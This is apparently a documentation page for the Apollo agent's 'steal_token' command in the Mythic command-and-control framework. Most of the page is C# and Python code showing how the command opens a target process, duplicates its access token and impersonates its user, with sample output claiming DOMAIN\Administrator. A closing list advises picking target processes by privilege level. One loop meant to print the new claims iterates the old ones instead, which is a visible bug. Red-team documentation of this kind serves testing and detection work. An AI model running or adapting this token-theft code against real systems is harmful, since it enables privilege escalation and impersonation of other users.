+++
title = "steal_token"
chapter = false
weight = 103
hidden = false
+++

{{% notice info %}}
Artifacts Generated: Process Open
{{% /notice %}}

## Summary
Steals the primary access token from a target process and sets it as both the primary and impersonation token for the Apollo agent. Opens the target process, duplicates its token, and updates the agent's identity context to operate under the stolen token's privileges.

- **Needs Admin:** False (depends on target process privileges)
- **Version:** 2
- **Author:** @djhohnstein

### Arguments
- **pid** (Number, Required) - Process ID to steal token from

## Usage
```
steal_token 1234
steal_token {"pid": 5678}
steal_token {"process_id": 9012}
```

**Output:**
```
Successfully impersonated DOMAIN\Administrator
Old Claims (Authenticated: True, AuthType: Negotiate):
...claim details...

New Claims (Authenticated: True, AuthType: Negotiate):
...claim details...
```

## Detailed Summary

### Agent Execution Flow

#### 1. Parameter Processing and Validation
```python
async def parse_arguments(self):
    if len(self.command_line) == 0:
        raise Exception("steal_token requires a PID to steal a token from.")
    
    try:
        if self.command_line[0] == '{':
            supplied_dict = json.loads(self.command_line)
            if "pid" in supplied_dict:
                self.add_arg("pid", int(supplied_dict["pid"]), type=ParameterType.Number)
            elif "process_id" in supplied_dict:
                self.add_arg("pid", int(supplied_dict["process_id"]), type=ParameterType.Number)
            else:
                self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("pid", int(self.command_line), type=ParameterType.Number)
    except:
        raise Exception(f"Invalid integer value given for PID: {self.command_line}")
```
- Validates PID parameter is provided
- Supports JSON format with "pid" or "process_id" keys
- Supports raw integer PID format
- Validates PID is valid integer value

#### 2. API Function Resolution
```csharp
public steal_token(IAgent agent, MythicTask data) : base(agent, data)
{
    _pOpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
    _pDuplicateTokenEx = _agent.GetApi().GetLibraryFunction<DuplicateTokenEx>(Library.ADVAPI32, "DuplicateTokenEx");
    _pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
}
```
- Resolves `OpenProcessToken` from advapi32.dll
- Resolves `DuplicateTokenEx` from advapi32.dll  
- Resolves `CloseHandle` from kernel32.dll
- Uses Apollo's dynamic API resolution framework

#### 3. Process Handle Acquisition
```csharp
try
{
    procHandle = System.Diagnostics.Process.GetProcessById((int) Convert.ToInt32(_data.Parameters)).Handle;
}
catch (Exception ex)
{
    errorMessage = $"Failed to acquire process handle to {_data.Parameters}: {ex.Message}";
}
```
- Uses `Process.GetProcessById()` to get process handle
- Converts string parameter to integer PID
- Handles process not found or access denied exceptions
- Stores error message for failed handle acquisition

#### 4. Process Open Artifact Generation
```csharp
if (procHandle != IntPtr.Zero)
{
    _agent.GetTaskManager().AddTaskResponseToQueue(
        CreateTaskResponse("", false, "", new IMythicMessage[]
        {
            Artifact.ProcessOpen(int.Parse(_data.Parameters))
        }));
}
```
- Generates process open artifact when handle acquired successfully
- Uses target PID for artifact logging
- Provides intermediate response before token operations

#### 5. Primary Token Extraction
```csharp
bool bRet = _pOpenProcessToken(
    procHandle,
    TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary | TokenAccessLevels.Query,
    out hProcessToken);

if (!bRet)
{
    errorMessage = $"Failed to open process token: {Marshal.GetLastWin32Error()}";
}
else
{
    _agent.GetIdentityManager().SetPrimaryIdentity(hProcessToken);
}
```
- Calls `OpenProcessToken` with required access levels
- Requests Duplicate, AssignPrimary, and Query access
- Sets extracted token as agent's primary identity
- Handles token extraction failures with Win32 error codes

#### 6. Impersonation Token Creation
```csharp
bRet = _pDuplicateTokenEx(
    hProcessToken,
    TokenAccessLevels.MaximumAllowed,
    IntPtr.Zero,
    TokenImpersonationLevel.Impersonation,
    1, // TokenImpersonation
    out hImpersonationToken);

if (!bRet)
{
    errorMessage = $"Failed to duplicate token for impersonation: {Marshal.GetLastWin32Error()}";
}
else
{
    _agent.GetIdentityManager().SetImpersonationIdentity(hImpersonationToken);
}
```
- Duplicates primary token for impersonation use
- Requests maximum allowed access on duplicated token
- Sets impersonation level to TokenImpersonationLevel.Impersonation
- Sets token type to 1 (TokenImpersonation)
- Updates agent's impersonation identity

#### 7. Identity Comparison and Reporting
```csharp
var old = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
_agent.GetIdentityManager().SetImpersonationIdentity(hImpersonationToken);
var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();

var stringOutput = $"Old Claims (Authenticated: {old.IsAuthenticated}, AuthType: ";
try
{
    stringOutput += $"{old.AuthenticationType}):\n";
}
catch
{
    stringOutput += $"AccessDenied):\n";
}

foreach (var item in old.Claims)
{
    stringOutput += item.ToString() + "\n";
}

stringOutput += $"\nNew Claims (Authenticated: {cur.IsAuthenticated}, AuthType: ";
try
{
    stringOutput += $"{cur.AuthenticationType}):\n";
}
catch
{
    stringOutput += $"AccessDenied):\n";
}

foreach (var item in old.Claims)
{
    stringOutput += item.ToString() + "\n";
}
```
- Captures old identity before token change
- Sets new impersonation identity
- Compares old and new identity claims
- Handles access denied exceptions when reading authentication type
- Enumerates claims for both old and new identities

#### 8. Callback Update and Response
```csharp
resp = CreateTaskResponse($"Successfully impersonated {cur.Name}\n{stringOutput}", true, "", new IMythicMessage[] {
    new CallbackUpdate{ ImpersonationContext = $"{cur.Name}" }
});
```
- Creates success response with impersonated user name
- Includes detailed claims comparison in response
- Updates callback context with new impersonation identity
- Provides callback update message for Mythic interface

#### 9. Resource Cleanup
```csharp
if (hProcessToken != IntPtr.Zero)
{
    _pCloseHandle(hProcessToken);
}

if (hImpersonationToken != IntPtr.Zero)
{
    _pCloseHandle(hImpersonationToken);
}
```
- Closes process token handle if opened
- Closes impersonation token handle if created
- Ensures proper resource cleanup regardless of success/failure

### Token Access Levels and Permissions

#### Required Token Access
```csharp
TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary | TokenAccessLevels.Query
```
- **Duplicate**: Required to duplicate the token
- **AssignPrimary**: Required to use token as primary token
- **Query**: Required to read token information

#### Impersonation Token Access
```csharp
TokenAccessLevels.MaximumAllowed
```
- Requests maximum possible access on duplicated token
- Actual access depends on caller's privileges and token security

#### Token Types and Levels
```csharp
TokenImpersonationLevel.Impersonation  // Impersonation level
1  // TokenImpersonation type constant
```
- Uses Impersonation level (not Identification or Delegation)
- Creates impersonation token type (not primary)

### Identity Manager Integration

#### Primary Identity Management
```csharp
_agent.GetIdentityManager().SetPrimaryIdentity(hProcessToken);
```
- Sets stolen token as agent's primary identity
- Affects agent's base security context

#### Impersonation Identity Management
```csharp
var old = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
_agent.GetIdentityManager().SetImpersonationIdentity(hImpersonationToken);
var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
```
- Retrieves current impersonation identity before change
- Sets new impersonation identity with stolen token
- Retrieves new identity for comparison reporting

### Error Handling

#### Process Handle Errors
```csharp
try
{
    procHandle = System.Diagnostics.Process.GetProcessById((int) Convert.ToInt32(_data.Parameters)).Handle;
}
catch (Exception ex)
{
    errorMessage = $"Failed to acquire process handle to {_data.Parameters}: {ex.Message}";
}
```
- Handles process not found exceptions
- Handles access denied when opening process
- Handles invalid PID format exceptions

#### Token Operation Errors
```csharp
if (!bRet)
{
    errorMessage = $"Failed to open process token: {Marshal.GetLastWin32Error()}";
}

if (!bRet)
{
    errorMessage = $"Failed to duplicate token for impersonation: {Marshal.GetLastWin32Error()}";
}
```
- Uses Win32 error codes for detailed error reporting
- Handles token access denied scenarios
- Handles token duplication failures

#### Authentication Type Access Errors
```csharp
try
{
    stringOutput += $"{old.AuthenticationType}):\n";
}
catch
{
    stringOutput += $"AccessDenied):\n";
}
```
- Handles access denied when reading authentication type
- Provides fallback error message in output

### Parameter Processing

#### Command Line Formats
```python
# Raw integer format
steal_token 1234

# JSON with "pid" key
steal_token {"pid": 1234}

# JSON with "process_id" key  
steal_token {"process_id": 1234}
```

#### Display Parameters
```python
response.DisplayParams = f"{taskData.args.get_arg('pid')}"
taskData.args.set_manual_args(f"{taskData.args.get_arg('pid')}")
```
- Shows target PID in task display
- Sets manual arguments for task representation

## APIs Used
| API | Purpose | DLL |
|-----|---------|-----|
| `Process.GetProcessById` | Get process handle | System.Diagnostics |
| `OpenProcessToken` | Extract process token | advapi32.dll |
| `DuplicateTokenEx` | Duplicate token for impersonation | advapi32.dll |
| `CloseHandle` | Close token handles | kernel32.dll |
| `GetLastWin32Error` | Retrieve error codes | kernel32.dll |

## MITRE ATT&CK Mapping
- **T1134** - Access Token Manipulation
- **T1528** - Steal Application Access Token

## Security Considerations
- **Token Theft**: Steals authentication tokens from other processes
- **Privilege Escalation**: May gain higher privileges through stolen tokens
- **Identity Impersonation**: Changes agent's security context
- **Process Access**: Requires ability to open target process
- **Token Duplication**: Creates new tokens for impersonation use

## Limitations
1. **Process Access**: Requires ability to open target process handle
2. **Token Access**: Needs sufficient privileges to access process token
3. **Session Scope**: Token theft limited to current session
4. **Architecture**: Must match target process architecture
5. **Process State**: Target process must be running and accessible

## Error Conditions
- **Invalid PID**: Non-existent or invalid process ID
- **Process Access Denied**: Insufficient privileges to open target process
- **Token Access Denied**: Cannot access target process token
- **Token Duplication Failed**: Unable to duplicate token for impersonation
- **Parameter Format Error**: Invalid PID format or JSON structure

## Best Practices
1. **Target Selection**: Choose processes with desired privilege levels
2. **Error Handling**: Monitor for access denied and privilege issues
3. **Resource Cleanup**: Ensure proper handle cleanup on completion
4. **Identity Verification**: Verify successful impersonation after token theft
5. **Privilege Awareness**: Understand current vs target privilege levels